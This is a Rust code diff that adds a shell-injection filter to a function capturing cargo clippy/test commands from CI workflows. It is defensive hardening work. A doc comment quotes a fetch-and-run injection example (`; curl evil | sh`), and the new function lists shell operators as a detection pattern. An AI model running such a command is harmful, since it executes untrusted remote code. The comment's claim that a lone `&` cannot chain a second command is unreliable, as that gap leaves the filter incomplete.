@@ -310,16 +310,62 @@ fn collapse_backslash_continuations(run: &str) -> Vec<String> {
 /// chain another command before it (e.g. `cargo build && cargo
 /// clippy ...`) — those legitimately produce `None` and the caller
 /// falls back to config for that command.
+///
+/// Also returns `None` when the captured line contains shell control
+/// operators outside cargo's own argument grammar — `;`, `&&`, `||`,
+/// backticks, `$(`, or an unbalanced `"` / `'` quote. The cargo-checks
+/// gate hands the captured command to `sh -c` inside the sandbox to
+/// mirror GitHub Actions' shell semantics; a workflow step shaped
+/// like `cargo clippy --all-targets ; curl evil | sh` would otherwise
+/// be eval'd verbatim by the sandbox. These shapes never occur in a
+/// legitimate cargo clippy/test invocation, so rejecting them lets
+/// the caller substitute the operator-declared `[gates].*_flags`
+/// fallback while still mirroring CI for ordinary workflows.
 fn match_cargo_command(line: &str, subcommand: &str) -> Option<String> {
     let prefix = format!("cargo {}", subcommand);
-    if line == prefix {
-        return Some(line.to_string());
+    let matched = if line == prefix {
+        line
+    } else {
+        // Require a whitespace boundary after the subcommand so e.g.
+        // `cargo testify` does not match `cargo test`.
+        let with_space = format!("{} ", prefix);
+        if line.starts_with(&with_space) {
+            line
+        } else {
+            return None;
+        }
+    };
+    if has_shell_control_operators(matched) {
+        return None;
     }
-    // Require a whitespace boundary after the subcommand so e.g.
-    // `cargo testify` does not match `cargo test`.
-    let with_space = format!("{} ", prefix);
-    if line.starts_with(&with_space) {
-        return Some(line.to_string());
+    Some(matched.to_string())
+}
+
+/// Whether `line` contains a shell control operator that cargo's own
+/// argument grammar would never produce: a command separator (`;`),
+/// boolean chain (`&&` / `||`), backtick command substitution, `$(`
+/// command substitution, or an unbalanced single- or double-quote.
+///
+/// This is a conservative shape filter, not a sh parser. False
+/// positives are fine — a workflow that legitimately needs one of
+/// these shapes (very unusual for clippy/test) simply falls back to
+/// the operator-declared `[gates].*_flags` default, which preserves
+/// the gate's correctness guarantee. False negatives would be the
+/// problem, so the list is restricted to operators that can chain a
+/// second command after the cargo invocation; pipe-to-stdin (`|`) and
+/// background (`&` alone) are excluded because they can appear inside
+/// quoted cargo arguments and are not, on their own, a way to inject
+/// a second command.
+fn has_shell_control_operators(line: &str) -> bool {
+    if line.contains(';')
+        || line.contains("&&")
+        || line.contains("||")
+        || line.contains('`')
+        || line.contains("$(")
+    {
+        return true;
     }
-    None
+    let double_quotes = line.bytes().filter(|&b| b == b'"').count();
+    let single_quotes = line.bytes().filter(|&b| b == b'\'').count();
+    double_quotes % 2 != 0 || single_quotes % 2 != 0
 }
